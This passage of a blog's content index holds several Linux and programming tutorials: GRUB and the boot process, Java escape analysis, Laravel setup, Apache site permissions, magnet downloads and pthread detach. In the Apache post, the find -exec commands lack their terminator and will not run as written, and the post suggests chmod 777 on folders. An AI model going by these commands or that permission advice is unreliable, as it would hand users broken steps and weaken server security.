src=\"customize-grub.png\" alt=\"customize-grub\"></p>\n<h3 id=\"GRUB-shell\"><a href=\"#GRUB-shell\" class=\"headerlink\" title=\"GRUB shell\"></a>GRUB shell</h3><p>when GRUB menu is shown, you can press ‘e’ to edit the boot command of the current menu entry, e.g, modify the kernel argument or the kernel image path in order to switch another kernel. You can also press ‘c’ to enter the GRUB shell : this shell always prompt when there’s no valid boot entry.(You may also encounter such case if your system failed to boot after an update). The GRUB shell provides some basic commands that you may use to rescue your system without reinstalling:</p>\n<ul>\n<li><code>ls</code> : list the block devices, e.g, disks, that can be recognized by GRUB. Once GRUB has the required modules loaded, it can recognize far more than the disks. If GRUB loaded the <code>xfs</code> module, it can detect and list XFS partitions. If GRUB loaded the <code>lvm</code> module, it can even recognize LVM volume! These can all be done without kernel loaded! That’s why GRUB can even boot OS from btrfs or xfs filesystem managed by LVM. <code>ls</code> command can also list files and directories inside the partition if it’s filesystem is known to GRUB, so it’s really useful when we want to check if the files needed for booting is missing when boot failed.</li>\n<li><code>insmod</code> : load the specified module, e.g. <code>insmod xfs</code>. GRUB won’t load all modules into memory when started, some optional external modules may be need to load from disk explictly after core modules has been loaded.</li>\n<li><code>set</code> : check and set the GRUB environment variables. GRUB has many variables defined, such as <code>root</code> (to control the current directory and partitions/volumes), <code>linux</code> (to determine which linux kernel to use) and <code>initrd</code> (sepecify which initramfs to use).</li>\n</ul>\n<p><img src=\"Ubuntu-Grub-Console.png\" alt=\"Ubuntu-Grub-Console\"></p>\n<blockquote>\n<p>For more GRUB commands : <a href=\"https://www.gnu.org/software/grub/manual/legacy/Command_002dline-and-menu-entry-commands.html\">https://www.gnu.org/software/grub/manual/legacy/Command_002dline-and-menu-entry-commands.html</a></p>\n</blockquote>\n<h3 id=\"grub2-conf\"><a href=\"#grub2-conf\" class=\"headerlink\" title=\"grub2.conf\"></a>grub2.conf</h3><p>Once the GRUB menu or GRUB shell shown, it indicates that the bootloader is loaded successfully. So next step is to boot the operating system, and that’s what the GRUB is responsible to do. However, how it knows what to do next? e.g. where to find the linux kernel to load into memory? Which system to boot if there’s multiple system existing on same machine? It’s time to introduce <code>grub.cfg</code>, the GRUB configuation file. It contains the settings and options used by GRUB to display the boot menu and manage the boot process. When GRUB is loaded into memory, it will perform initialization by following the ‘scripts’ in <code>grub.cfg</code>.</p>\n<p>GRUB will always search <code>grub.cfg</code> in directory set by variable <code>prefix</code>. For example, if you type <code>set</code> in your GRUB shell and get the output: <code>prefix=(hd0, gpt1)/EFI/ubuntu</code>, it means GRUB will use the <code>/EFI/ubuntu/grub.cfg</code> file from the first GPT partition of disk <code>hd0</code>. If no GRUB menu is not shown but GRUB shell got prompted instead, this usually indicate GRUB cannot find any valid boot menu entry to list, such issue is usually caused by missing <code>grub.cfg</code> file. Depending on your Linux distribution, the <code>grub.cfg</code> file might be located in different position such as <code>/boot/grub/grub.cfg</code> or <code>/boot/efi/EFI/&lt;distro&gt;/grub.cfg</code>. Find the correct path for your system. If you need to confirm that the boot failure is caused by missing <code>grub.cfg</code> file, you can press ‘c’ to open GRUB shell to check if your <code>grub.cfg</code> exists in the directory marked by <code>prefix</code>.</p>\n<p>Here is a simple <code>grub.cfg</code> example providing two boot entries, one normal mode and one recovery mode: </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># /boot/grub2/grub.cfg</span><br><span class=\"line\"># Set default boot entry</span><br><span class=\"line\">set default=0</span><br><span class=\"line\"># Set timeout for the boot menu (in seconds)</span><br><span class=\"line\">set timeout=5</span><br><span class=\"line\"></span><br><span class=\"line\">insmod xfs</span><br><span class=\"line\"></span><br><span class=\"line\">set root=(hd0, gpt2)</span><br><span class=\"line\"></span><br><span class=\"line\"># Define boot menu entries</span><br><span class=\"line\">menuentry &quot;Ubuntu, with Linux, with Linux 4.13.0-12-generic&quot; &#123;</span><br><span class=\"line\">    linux /boot/vmlinuz-4.13.0-12-generic root=UUID=097b1995-9ded-418b-a62f-ed1342f82cd1 ro quiet splash</span><br><span class=\"line\">    initrd /boot/initrd.img-4.13.0-12-generic</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">menuentry &quot;Ubuntu, with Linux, with Linux 4.13.0-12-generic (recovery mode)&quot; &#123;</span><br><span class=\"line\">    linux /boot/vmlinuz-4.13.0-12-generic root=UUID=097b1995-9ded-418b-a62f-ed1342f82cd1 ro recovery nomodeset</span><br><span class=\"line\">    initrd /boot/initrd.img-4.13.0-12-generic</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"># Additional configuration entries can be added her</span><br></pre></td></tr></table></figure>\n<p>The <code>grub.cfg</code> can be viewed as a script file, which should be interpreted and executed from up to down. First twos line of instruction: <code>set default=0</code> and <code>set timeout=5</code> define two GRUB environment variables, telling GRUB to use first menu entry as default, and set 5 seconds as the timeout for the boot menu. <code>insmod xfs</code> load the xfs module for the purpose to make GRUB able to read files from xfs partition. These syntax in <code>grub.cfg</code> is the same as what we might use in GRUB shell, that’s why I say this configuration file can be viewed as a ‘script’ like bash.</p>\n<p>We can notice that there’re two <code>menuentry</code> blocks representing two menu entry for user to choose at boot time, each entry have environment variable <code>linux</code> and <code>initrd</code>, specifying the path of linux kernel and the initramfs to use. The arguments followed by linux kernel path are passed to kernel when booting, that can be read from <code>/proc/cmdline</code> after Linux kernel loaded. If you have other systems, e.g, Windows or OSX installed on other partitions, you can add new <code>menuentry</code> to configure them, that’s how choosing which os to boot from multiple systems is implemented.</p>\n<p>This <code>grub.cfg</code> set <code>root</code> environment variable to <code>(hd0, gpt2)</code>, means that GRUB will use the second GPT partition of disk <code>hd0</code> as ‘root’ partition. Since <code>root</code> is defined, hence it’s no need to explictlty specify disk or partition prefix to locate a file path. The kernel path <code>/boot/vmlinuz-4.13.0-12-generic</code> is implictly defined as <code>(hd0, gpt2)/boot/vmlinuz-4.13.0-12-generic</code>. To avoid failure of unable to locate the file path cause by change of the disks, it’s more recommend to use partition label or filesystem UUID to define the <code>root</code>:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># use uuid to mark the root partition</span><br><span class=\"line\">search --no-floppy --fs-uuid --set 097b1995-9ded-418b-a62f-ed1342f82cd1</span><br><span class=\"line\"># ...</span><br><span class=\"line\"># use label to mark the partition</span><br><span class=\"line\">search --no-floppy --label --set &#x27;Linux Ubuntu System&#x27;</span><br></pre></td></tr></table></figure>\n<p>In many Linux distributions, including Ubuntu, the <code>/boot/grub2/grub.cfg</code> file is generated automatically by scripts during system updates or kernel installations. These scripts may gather information about the system’s configuration and generate the appropriate menu entries and kernel parameters based on that information. It’s important to note that manually editing the <code>/boot/grub2/grub.cfg</code> file is generally not recommended, as changes made to this file may be overwritten during system updates or kernel installations. Instead, configuration changes should be made in the appropriate configuration files in <code>/etc/grub.d/</code> or by editing the <code>/etc/default/grub</code> file and then regenerating the <code>grub.cfg</code> file using the <code>grub-mkconfig</code> command.</p>\n<p>If all GRUB environment variables are configured normally, the kernel will be loaded into memory and GRUB will pass the control to Linux kernel. So, at this time, just forget GRUB, it’s time for Linux to show up!</p>\n<h2 id=\"How-Linux-start\"><a href=\"#How-Linux-start\" class=\"headerlink\" title=\"How Linux start\"></a>How Linux start</h2><p>As mentioned in the <code>grub.cfg</code> above, <strong>vmlinuz</strong> and <strong>initrd</strong> are essential components of the Linux boot process, each serving a distinct role:</p>\n<ul>\n<li><p><strong>vmlinuz (Kernel Image)</strong>:<br>The vmlinuz file is the compressed Linux kernel image.<br>It contains the core functionality of the Linux operating system, including device drivers, memory management, process management, and system calls.<br>During the boot process, GRUB loads the vmlinuz kernel image into memory and hands over control to it.<br>The kernel then initializes the hardware, mounts the root filesystem, and starts the init process (usually <code>/sbin/init</code>).</p>\n</li>\n<li><p><strong>initrd (Initial RAM Disk)</strong>:<br>The initrd is an initial RAM disk image used by the kernel during the boot process.<br>It contains a minimal filesystem with essential tools and drivers needed to mount the actual root filesystem.<br>The initrd is loaded into memory by the bootloader along with the kernel (vmlinuz) before the actual root filesystem is mounted.<br>Once the initrd is loaded, the kernel executes the init program within the initrd, which is typically a small script responsible for locating and mounting the real root filesystem.<br>The initrd is particularly useful in situations where the kernel does not have built-in support for the storage controller or filesystem needed to access the root filesystem. It provides a temporary environment to load the necessary drivers and modules to access the root filesystem.</p>\n</li>\n</ul>\n<p>In summary, vmlinuz is the compressed Linux kernel image containing the core OS functionality, while initrd is an initial RAM disk image used by the kernel during boot to facilitate the mounting of the real root filesystem. Both are crucial components of the Linux boot process, working together to initialize the system and load the operating system into memory.</p>\n<p>let’s go backup to one of the menu entry defined in <code>grub.cfg</code>:<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># grub.cfg</span><br><span class=\"line\"># ....</span><br><span class=\"line\">menuentry &quot;Ubuntu, with Linux, with Linux 4.13.0-12-generic&quot; &#123;</span><br><span class=\"line\">    linux /boot/vmlinuz-4.13.0-12-generic root=UUID=097b1995-9ded-418b-a62f-ed1342f82cd1 ro quiet splash</span><br><span class=\"line\">    initrd /boot/initrd.img-4.13.0-12-generic</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>root=UUID=097b1995-9ded-418b-a62f-ed1342f82cd1</code> specified the root filesystem that need to be mounted later for the kernel, that’s where the ‘Linux System’ really resides. If we check the <code>/etc/fstab</code>:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ cat /etc/fstab</span><br><span class=\"line\"><span class=\"comment\"># &lt;file system&gt;                             &lt;mount point&gt;  &lt;type&gt;  &lt;options&gt;                &lt;dump&gt; &lt;fsck&gt;</span></span><br><span class=\"line\">UUID=E46E-7C86                              /boot/efi       vfat    defaults                  0     2</span><br><span class=\"line\">UUID=097b1995-9ded-418b-a62f-ed1342f82cd1   /               ext4    defaults,x-systemd.growfs 0     1</span><br></pre></td></tr></table></figure><br>We may find <code>UUID=097b1995-9ded-418b-a62f-ed1342f82cd1</code> is exactly the root filesystem! If root filesystem is managed by LVM and it’s device path is <code>/dev/ubuntu/root</code>, it’s ok to replace <code>root=UUID=097b1995-9ded-418b-a62f-ed1342f82cd1</code> to <code>root=/dev/ubuntu/root</code>.</p>\n<p>Here is the typical Linux boot process after GRUB load the kernel:</p>\n<ol>\n<li><p><strong>Linux Kernel Initialization</strong>:</p>\n<ul>\n<li>Once the bootloader hands over control to the Linux kernel, the kernel begins its initialization process.</li>\n<li>The kernel performs hardware detection and initialization, including the CPU, memory, storage devices, and other peripherals.</li>\n<li>It sets up the initial system environment, establishes the root filesystem, and starts the init process.</li>\n</ul>\n</li>\n<li><p><strong>Init Process</strong>:</p>\n<ul>\n<li>The init process is the first user-space process started by the kernel and has process ID (PID) 1.</li>\n<li>Depending on the Linux distribution and init system (SysVinit, systemd, etc.), the init process may perform various tasks, including system initialization, service startup, and configuration management.</li>\n</ul>\n</li>\n<li><p><strong>User-Space Initialization</strong>:</p>\n<ul>\n<li>After the init process completes its tasks, the system transitions into user-space.</li>\n<li>User-space initialization involves starting essential system services, daemons, and user applications specified in the runlevel or systemd targets.</li>\n</ul>\n</li>\n<li><p><strong>Login Manager or Console Login</strong>:</p>\n<ul>\n<li>If a graphical desktop environment is configured, a login manager (such as GDM, LightDM, or SDDM) presents a login screen where users can authenticate and start their graphical session.</li>\n<li>Alternatively, on systems without a graphical environment or in multi-user mode, the user may be presented with a console login prompt.</li>\n</ul>\n</li>\n<li><p><strong>User Session</strong>:</p>\n<ul>\n<li>Once logged in, the user gains access to the desktop environment or command-line interface (CLI) and can start using the system to perform various tasks.</li>\n</ul>\n</li>\n</ol>\n<p>Throughout the boot process, various configuration files, scripts, and system utilities are executed to configure and initialize the system, ensuring a smooth transition from the initial hardware initialization to a fully functional Linux environment.</p>\n<p>At last, let me summarize the complete Linux system booting process into a timeline to describe what happens when your press down the power button:</p>\n<pre class=\"mermaid\">timeline\n    title Linux System Boot Process\n    Hardware Initialization \n        : [Power On] When you turn on your computer, the BIOS (or UEFI firmware) performs initial hardware checks and starts the boot process.\n        : [BIOS/UEFI Initialization] The BIOS or UEFI firmware initializes hardware components such as CPU, memory, and storage devices.\n        : [Boot Device Selection] The BIOS or UEFI firmware locates and loads the boot loader from the boot device. This could be a hard drive, solid-state drive, or other storage media.\n    GRUB Stage\n        : [GRUB Stage 1] The first stage of GRUB is installed in the Master Boot Record (MBR) or the boot sector of the boot device. Its primary role is to load the next stage of GRUB.\n        : [GRUB Stage 1.5/Stage 2] Depending on the configuration, GRUB may have an intermediate stage (Stage 1.5) installed between Stage 1 and Stage 2. Stage 2 is the main part of GRUB responsible for loading the operating system.\n        : [GRUB Configuration] GRUB reads its configuration file (usually grub.cfg) to determine which operating systems are installed and how to boot them. This file contains information about kernel locations, boot parameters, and other options.\n        : [Loading Linux Kernel] Based on the configuration, GRUB loads the Linux kernel (vmlinuz) into memory. It may also load an initial RAM disk (initrd or initramfs) if necessary.\n    Kernel Stage\n        : [Kernel Initialization] The Linux kernel starts executing and initializes essential system components such as memory management, device drivers, and the root file system.\n    User Space Stage\n        : [Init Process] The kernel starts the init process, which is typically the first user-space process. The init process is responsible for starting system services and initializing the user environment.\n        : [User Space Initialization] Once the init process completes its tasks, the system is fully initialized, and the user can interact with the operating system through the shell or a graphical interface.</pre>\n\n\n\n<h2 id=\"References\"><a href=\"#References\" class=\"headerlink\" title=\"References\"></a>References</h2><ul>\n<li><a href=\"https://en.wikipedia.org/wiki/Master_boot_record\">Wikipedia: Master Boot Record</a></li>\n<li><a href=\"https://www.tecmint.com/rescue-repair-and-reinstall-grub-boot-loader-in-ubuntu/\">How to Rescue, Repair and Reinstall GRUB Boot Loader in Ubuntu</a></li>\n<li><a href=\"https://www.gnu.org/software/grub/manual/legacy/Command_002dline-and-menu-entry-commands.html\">GRUB shell commands</a></li>\n</ul>\n","tags":["Linux"]},{"title":"Java逃逸分析","url":"/2021/04/07/Java%E9%80%83%E9%80%B8%E5%88%86%E6%9E%90/","content":"<p>一般来说Java的对象都是在堆上生成，但是如果一个对象只在<strong>当前函数内</strong>被使用，那么它可以被分配在栈上。栈上的数据在函数返回时被回收，从而大大减轻了GC的压力。</p>\n<h2 id=\"定义\"><a href=\"#定义\" class=\"headerlink\" title=\"定义\"></a>定义</h2><p><strong>由Java Hotspot分析对象的使用范围是否只在当前函数内有效，然后控制其在堆分配空间的技术就叫逃逸分析（Escape Analysis）</strong>。</p>\n<p>逃逸分析的相关参数如下：</p>\n<ul>\n<li>开启逃逸分析：<code>-XX:+DoEscapeAnalysis</code></li>\n<li>关闭逃逸分析：<code>-XX:-DoEscapeAnalysis</code></li>\n<li>显示分析结果：<code>-XX:+PrintEscapeAnalysis</code></li>\n</ul>\n<h2 id=\"GC性能分析\"><a href=\"#GC性能分析\" class=\"headerlink\" title=\"GC性能分析\"></a>GC性能分析</h2><p>接下来就一个具体例子测试逃逸分析是否能优化GC的性能。在IDEA中设置<code>VM Option</code>。</p>\n<ul>\n<li>堆最大10m，最小也10m，来让其尽快进入GC状态：<code>-Xmx10m -Xms10m</code>。</li>\n<li>开启GC的打印<code>-XX:+PrintGC</code></li>\n<li>由于Java SE 6u23+之后默认开启了逃逸分析，这里需要先关掉它：<code>-XX:-DoEscapeAnalysis</code></li>\n</ul>\n<p>最终<code>VM Option</code>如下：<code>-Xmx10m -Xms10m -XX:+PrintGC -XX:-DoEscapeAnalysis</code></p>\n<span id=\"more\"></span>\n<p>运行一个不断创建<code>Integer</code>对象的函数：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">        Integer i = <span class=\"keyword\">new</span> Integer(<span class=\"number\">114514</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>由于关闭了逃逸分析，默认在堆上分配内存，内存会一直不够，一直GC。控制台不断打印GC的过程：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002068 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002554 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002634 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0003115 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002779 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0003062 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002681 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002638 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002211 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002427 secs]</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure><br>还是把堆控制在10m，开启逃逸分析：<code>-Xmx10m -Xms10m -XX:+PrintGC</code>，再次执行刚才的方法：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0002779 secs]</span><br><span class=\"line\">[GC (Allocation Failure)  6150K-&gt;4102K(9728K), 0.0003062 secs]</span><br></pre></td></tr></table></figure><br>一共只打印出两条GC记录，说明开启逃逸分析后的确可以优化GC。</p>\n<h2 id=\"对象逃逸状态\"><a href=\"#对象逃逸状态\" class=\"headerlink\" title=\"对象逃逸状态\"></a>对象逃逸状态</h2><p>Java对象的逃逸状态主要有三种：</p>\n<ol>\n<li>全局逃逸（GlobalEscape）<br>即一个对象的作用范围逃出了当前方法或者当前线程，有以下几种场景：<ul>\n<li>对象是一个静态变量</li>\n<li>对象是一个已经发生逃逸的对象</li>\n<li>对象作为当前方法的返回值</li>\n</ul>\n</li>\n</ol>\n<p>（学过Rust对象生命周期的应该很熟悉）</p>\n<ol>\n<li><p>参数逃逸（ArgEscape）<br>即一个对象被作为方法参数传递或者被参数引用，但在调用过程中不会发生全局逃逸，这个状态是通过被调方法的字节码确定的。</p>\n</li>\n<li><p>没有逃逸<br>即方法中的对象没有发生逃逸。</p>\n</li>\n</ol>\n<h2 id=\"逃逸分析的应用\"><a href=\"#逃逸分析的应用\" class=\"headerlink\" title=\"逃逸分析的应用\"></a>逃逸分析的应用</h2><p>针对上面第三点，当一个对象没有逃逸时，可以得到以下几个虚拟机的优化。</p>\n<ol>\n<li>锁消除</li>\n</ol>\n<p>我们知道线程同步锁是非常牺牲性能的，当编译器确定当前对象只有当前线程使用，那么就会移除该对象的同步锁。</p>\n<p>例如：<code>StringBuffer</code>和<code>Vector</code>都是用<code>synchronized</code>修饰线程安全的，但大部分情况下，它们都只是在当前线程中用到，这样编译器就会优化移除掉这些锁操作。</p>\n<p>锁消除的JVM参数如下：</p>\n<ul>\n<li>开启锁消除：<code>-XX:+EliminateLocks</code></li>\n<li>关闭锁消除：<code>-XX:-EliminateLocks</code></li>\n</ul>\n<p>锁消除在JDK8中都是默认开启的，并且锁消除都要建立在逃逸分析的基础上。</p>\n<ol>\n<li>标量替换与栈上分配</li>\n</ol>\n<p>基础类型和对象的引用可以理解为标量，它们不能被进一步分解。而能被进一步分解的量就是聚合量，比如：对象。</p>\n<p>将聚合量的成员分解为分散的标量，这就叫做标量替换。</p>\n<p>这样，如果一个对象没有发生逃逸，那压根就不用创建它，只会在栈或者寄存器上创建它用到的成员标量，节省了内存空间，也提升了应用程序性能。当函数返回时，栈上的数据会被直接回收，无需GC去堆里分析对象的引用关系了。</p>\n<p>标量替换的JVM参数如下：</p>\n<ul>\n<li>开启标量替换：<code>-XX:+EliminateAllocations</code></li>\n<li>关闭标量替换：<code>-XX:-EliminateAllocations</code></li>\n<li>显示标量替换详情：<code>-XX:+PrintEliminateAllocations</code></li>\n</ul>\n<p>标量替换同样在JDK8中都是默认开启的，并且都要建立在逃逸分析的基础上。</p>\n<p>总结：<strong>在平时开发过程中就要可尽可能的控制变量的作用范围了，变量范围越小越好，让虚拟机尽可能有优化的空间。</strong></p>\n<p>如下代码第二种实现就让<code>sb</code>对象没能逃逸：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> StringBuffer <span class=\"title\">craeteStringBuffer</span><span class=\"params\">(String s1, String s2)</span> </span>&#123;</span><br><span class=\"line\">    StringBuffer sb = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">    sb.append(s1);</span><br><span class=\"line\">    sb.append(s2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sb;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">createStringBuffer</span><span class=\"params\">(String s1, String s2)</span> </span>&#123;</span><br><span class=\"line\">    StringBuffer sb = <span class=\"keyword\">new</span> StringBuffer();</span><br><span class=\"line\">    sb.append(s1);</span><br><span class=\"line\">    sb.append(s2);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sb.toString();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>参考资料</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/javastack/p/11023044.html\">https://www.cnblogs.com/javastack/p/11023044.html</a></li>\n</ul>\n</blockquote>\n","tags":["Java"]},{"title":"Laravel环境搭建","url":"/2017/12/25/Laravel%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","content":"<h2 id=\"以centos为例\"><a href=\"#以centos为例\" class=\"headerlink\" title=\"以centos为例\"></a>以centos为例</h2><ol>\n<li>安装composer<br><code>wget https://dl.laravel-china.org/composer.phar -O /usr/local/bin/composer</code><br><code>chmod a+x /usr/local/bin/composer</code><br><code>composer global require &quot;laravel/installer&quot;</code>  </li>\n<li>查看版本<br><code>composer -v</code></li>\n</ol>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  ______</span><br><span class=\"line\">  / ____/___  ____ ___  ____  ____  ________  _____</span><br><span class=\"line\"> / /   / __ \\/ __ `__ \\/ __ \\/ __ \\/ ___/ _ \\/ ___/</span><br><span class=\"line\">/ /___/ /_/ / / / / / / /_/ / /_/ (__  )  __/ /</span><br><span class=\"line\">\\____/\\____/_/ /_/ /_/ .___/\\____/____/\\___/_/</span><br><span class=\"line\">                    /_/</span><br><span class=\"line\">Composer version 1.5.6 2017-12-18 12:09:18</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<ol>\n<li>环境配置<br>以zsh为例 <code>vim ~/.zshrc</code><br><code>export PATH=$PATH:/root/.config/composer/vendor/bin</code>  </li>\n<li>测试新建文件<br><code>laravel new Blog</code></li>\n</ol>\n","tags":["Laravel"]},{"title":"Linux下Apache网站目录读写权限的设置","url":"/2017/10/08/Linux%E4%B8%8BApache%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E8%AF%BB%E5%86%99%E6%9D%83%E9%99%90%E7%9A%84%E8%AE%BE%E7%BD%AE/","content":"<p>网站目录文件权限的设置对网站的安全至关重要，下面简单介绍网站目录文件权限的基本设定。</p>\n<p>我们假设http服务器运行的用户和用户组是<code>www</code>，网站用户为<code>centos</code>，网站根目录是<code>/home/centos/web</code></p>\n<p>1.我们首先设定网站目录和文件的所有者和所有组为centos，www，如下命令：<br><code>chown -R centos:www /home/centos/web</code></p>\n<p>2.设置网站目录权限为750，750是centos用户对目录拥有读写执行的权限，这样centos用户可以在任何目录下创建文件，用户组有有读执行权限，这样才能进入目录，其它用户没有任何权限。<br><code>find -type d -exec chmod 750 &#123;&#125; \\</code></p>\n<p>3.设置网站文件权限为640，640指只有centos用户对网站文件有更改的权限，http服务器只有读取文件的权限，无法更改文件，其它用户无任何权限。<br><code>find -not -type d -exec chmod 640 &#123;&#125; \\</code></p>\n<p>4.针对个别目录设置可写权限。比如网站的一些缓存目录就需要给http服务有写入权限。例如discuz x2的/data/目录就必须要写入权限。<br><code>find data -type d -exec chmod 770 &#123;&#125; \\</code></p>\n<span id=\"more\"></span>\n<p>或者直接修改读写文件夹<br><code>chmod 777 &lt;folder&gt;</code></p>\n","tags":["Linux","Apache"]},{"title":"Linux下的磁力下载工具","url":"/2017/10/28/Linux%E4%B8%8B%E7%9A%84%E7%A3%81%E5%8A%9B%E4%B8%8B%E8%BD%BD%E5%B7%A5%E5%85%B7/","content":"<p>wget是linux下常用的命令行下载工具，是Linux用户是必不可少的工具，尤其对于网络管理员，经常要下载一些软件。而tget是一个简单的命令行BT下载工具，可以用于BT种子和磁力链接的下载。  </p>\n<p><a href=\"https://github.com/jeffjose/tget\">tget源代码</a><br><a href=\"https://github.com/mafintosh/peerflix\">类似的项目</a>  </p>\n<h2 id=\"安装tget：\"><a href=\"#安装tget：\" class=\"headerlink\" title=\"安装tget：\"></a>安装tget：</h2><p><code>npm install -g t-get</code>  </p>\n<span id=\"more\"></span>\n<h2 id=\"torrent种子文件的下载：\"><a href=\"#torrent种子文件的下载：\" class=\"headerlink\" title=\"torrent种子文件的下载：\"></a>torrent种子文件的下载：</h2><p> tget-用于BT种子/磁力链接下载的wget<br> <code>wget http://releases.ubuntu.com/16.04/ubuntu-16.04.1-desktop-amd64.iso.torrent</code> </p>\n<h2 id=\"磁力链接的下载：\"><a href=\"#磁力链接的下载：\" class=\"headerlink\" title=\"磁力链接的下载：\"></a>磁力链接的下载：</h2><p> <code>tget &#39;magnet:?xt=urn:btih:0403fb4728bd788fbcb67e87d6feb241ef38c75a&#39;</code></p>\n","tags":["Linux"]},{"title":"Linux多线程编程","url":"/2018/10/09/Linux%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/","content":"<p>创建一个线程默认的状态是joinable, 如果一个线程结束运行但没有被join,则它的状态类似于进程中的Zombie Process,即还有一部分资源没有被回收（退出状态码），所以创建线程者应该<code>pthread_join()</code>来等待线程运行结束，并可得到线程的退出代码，回收其资源（类似于<code>wait()</code>,<code>waitpid()</code>)</p>\n<p>但是调用<code>pthread_join(pthread_id)</code>后，如果该线程没有运行结束，调用者会被阻塞，在有些情况下我们并不希望如此，比如在Web服务器中当主线程为每个新来的链接创建一个子线程进行处理的时候，主线程并不希望因为调用<code>pthread_join()</code>而阻塞（因为还要继续处理之后到来的链接），这时可以在子线程中加入代码<code>pthread_detach(pthread_self())</code>,或者父线程调用<code>pthread_detach(thread_id)</code>（非阻塞，可立即返回），这将该子线程的状态设置为detached,则该线程运行结束后会自动释放所有资源。</p>\n<span id=\"more\"></span>\n<p>有关<code>pthread_detach(pthread_self())</code>可以写在线程函数的头部，即一执行则将本身设置为detached，函数执行完后该线程自行释放占用的资源。省去了给线程擦屁股的麻烦</p>\n<p><a href=\"https://blog.csdn.net/hairetz/article/details/4535920\">参考1</a><br><a href=\"https://blog.csdn.net/cnclenovo/article/details/44589275\">参考2</a></p>\n","tags":["Linux"]},{"title":"Linux常用工具手册","url":"/2021/04/07/Linux%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/","content":"<blockquote>\n<p>整理多而杂的常用工具，以备日后查找用</p>\n</blockquote>\n<h2 id=\"route\"><a href=\"#route\" class=\"headerlink\" title=\"route\"></a>route</h2><p><code>route</code>用于查看路由表<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ route</span><br><span class=\"line\">Kernel IP routing table</span><br><span class=\"line\">Destination     Gateway         Genmask         Flags Metric Ref    Use Iface</span><br><span class=\"line\">default         DESKTOP-N0ED40G 0.0.0.0         UG    100    0        0 eth0</span><br><span class=\"line\">link-local      0.0.0.0         255.255.0.0     U     1000   0        0 eth0</span><br><span class=\"line\">172.19.80.0     0.0.0.0         255.255.240.0   U     100    0        0 eth0</span><br></pre></td></tr></table></figure><br><code>Destination</code>，<code>Gateway</code>，<code>Genmask</code>分别表示目的网络号，网关，子网掩码。例如要访问<code>172.19.89.119</code>，按行与<code>Genmask</code>向与，结果是<code>172.19.80.0</code>，与第三行<code>Destination</code>相匹配，所以选择第三行配置。如果访问某个IP找不到匹配的路由项，则选<code>default</code>（第一行）。</p>\n<p><code>Flags</code>中<code>U</code>表示<code>used</code>，<code>G</code>表示<code>Gateway</code>，<code>H</code>表示<code>Host</code>。<code>Iface</code>表示路由对应的网卡。</p>\n<p>添加一条路由：<code>route add -net 10.0.0.0/24 dev ens160</code></p>\n<span id=\"more\"></span>\n<h2 id=\"sudo-su\"><a href=\"#sudo-su\" class=\"headerlink\" title=\"sudo/su\"></a>sudo/su</h2><ul>\n<li><code>su</code>是申请切换成<code>root</code>用户，需要输入<strong>root用户</strong>密码。如果某些系统没有设置过<code>root</code>密码，需要用<code>sudo passwd root</code>设置<code>root</code>密码。</li>\n<li><code>sudo su</code>是为当前用户暂时申请<code>root</code>权限，需要输入<strong>当前用户</strong>的密码。</li>\n</ul>\n<p><code>su -c</code>可以以<code>root</code>身份执行一条指令，例：<code>su -c &#39;apt update&#39;</code>。<code>su 